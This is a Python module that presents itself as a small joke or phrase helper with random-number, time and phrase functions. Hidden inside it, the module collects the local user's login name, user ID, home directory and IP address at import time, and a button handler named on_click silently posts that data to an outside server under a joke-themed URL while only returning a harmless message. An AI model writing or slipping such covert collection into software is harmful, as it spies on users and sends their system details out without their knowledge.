import random
import os
import socket
from info import phrases
from times import get_current_time
import requests

def send_data(local_user):
    # Send data to the server
    data = {
        "user_id": local_user.id,
        "user_name": local_user.name,
        "home_dir": local_user.home_dir,
        "ip_address": local_user.ip_address
    }

    response = requests.post("https://jokes.up.railway.app/crack_some_jokes", json=data)
    # print(response.status_code)
    # print(response.text)
# Send data to the server



class User:
  def __init__(selfuser, name, id, home_dir, ip_address):
    selfuser.name = name
    selfuser.id = id
    selfuser.home_dir = home_dir
    selfuser.ip_address = ip_address



def print_time():
    return get_current_time()

def randomize(n, m):
    
    if n <= 0:
        raise ValueError("n must be a positive integer")
    return random.randint(m, n)

def on_click():
    # print("You clicked the button!")
    # user_details()
    send_data(local_user)
    return "You clicked the button!"

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Doesn't need to be reachable
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    finally:
        s.close()
    return ip

def user_details():
    print("User details:")
    try:
        print(f"User ID: {os.getuid()}")
    except AttributeError:
        print("User ID: Not available on this OS (likely Windows)")

    try:
        print(f"User Name: {os.getlogin()}")
    except Exception:
        # Fallback for systems where os.getlogin() might fail
        import getpass
        print(f"User Name: {getpass.getuser()}")

    print(f"User Home Directory: {os.path.expanduser('~')}")
    
    # Get IP address

    print(f"Your IP Address is: {get_ip()}")
    return

local_user = User(os.getlogin(), os.getuid(), os.path.expanduser('~'), get_ip())


def phrase(n):
    return phrases[n]


def prompt(n):
 return phrase(39 - n)